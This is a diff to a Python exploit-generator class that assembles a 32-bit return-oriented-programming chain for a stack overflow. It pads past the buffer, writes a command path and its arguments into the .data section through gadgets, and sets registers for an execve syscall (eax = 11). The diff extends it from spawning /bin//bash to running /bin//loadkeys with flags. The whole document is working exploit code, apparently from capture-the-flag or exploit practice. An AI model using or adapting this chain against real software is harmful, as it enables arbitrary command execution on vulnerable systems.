@@ -48,53 +48,48 @@ class ParseChain():
         
     def parse_data_loc(self, data_loc):
         self.DATA = int(data_loc, 16)
+
+
+    def build_stack_str(self, p, s, offset, bound):
+        for i in range(0, bound):
+            p += self.POP_EDX
+            p += pack('<I', self.DATA + offset + i*4)
+            p += self.POP_EAX
+            if i*4+4 <= len(s):
+                p += str.encode(s[i*4:i*4+4])
+            else:
+                p += str.encode(s[i*4:len(s)])
+                p += b'A' * (bound*4 - len(s))
+            p += self.MOVSTACK
         
-    def make_chain(self, cmd=''):
+        p += self.POP_EDX
+        p += pack('<I', self.DATA + offset + len(s))
+        p += self.XOR_EAX
+        p += self.MOVSTACK
+
+        return p
+        
+    def make_chain(self, cmd='', args=[]):
         p = b'A'*40
         p += b'B'*4
 
+        offset = 0
         cmd_bound = math.ceil(len(cmd) / 4)
+        p = self.build_stack_str(p, cmd, offset, cmd_bound)
 
-        for i in range(0, cmd_bound):
-            p += self.POP_EDX
-            p += pack('<I', self.DATA + i*4)
-            p += self.POP_EAXbash
-            if i*4+4 <= len(cmd):
-                p += str.encode(cmd[i*4:i*4+4])
-            else:
-                p += str.encode(cmd[i*4:len(cmd)])
-                p += b'A' * (cmd_bound*4 - len(cmd))
-            p += self.MOVSTACK
-        
-        '''p += self.POP_EDX
-        p += pack('<I', self.DATA)
-        p += self.POP_EAX
-        p += b'/bin'
-        p += self.MOVSTACK
-
-        p += self.POP_EDX
-        p += pack('<I', self.DATA + 4)
-        p += self.POP_EAX
-        p += b'//sh'
-        p += self.MOVSTACK'''
-
-        p += self.POP_EDX
-        p += pack('<I', self.DATA + len(cmd))
-        p += self.XOR_EAX
-        p += self.MOVSTACK
-
-        p += self.POP_EDX
-        p += pack('<I', self.DATA + cmd_bound * 4)
-        p += self.XOR_EAX
-        p += self.MOVSTACK
+        offset += cmd_bound * 4 + 4
+        for arg in args:
+            bound = math.ceil(len(arg) / 4)
+            p = self.build_stack_str(p, arg, offset, bound)
+            offset += bound * 4 + 1
 
         p += self.POP_EBX
         p += pack('<I', self.DATA)
         p += self.POP_ECX_EBX
-        p += pack('<I', self.DATA + cmd_bound * 4)
+        p += pack('<I', self.DATA + len(cmd))
         p += pack('<I', self.DATA)
         p += self.POP_EDX
-        p += pack('<I', self.DATA + cmd_bound * 4)
+        p += pack('<I', self.DATA + len(cmd))
 
         p += self.XOR_EAX
         for _ in range(0, 11): p += self.INC_EAX
@@ -117,7 +112,7 @@ class ParseChain():
             regex = re.search("# @ .data\n", line)
             if regex: self.parse_data_loc(line.split(",")[1][1:11])
         
-        chain = self.make_chain('/bin//bash')
+        chain = self.make_chain('/bin//loadkeys', ['-tte', '-sssk', '-k'])
         self.write_chain(chain)
 
 pc = ParseChain()
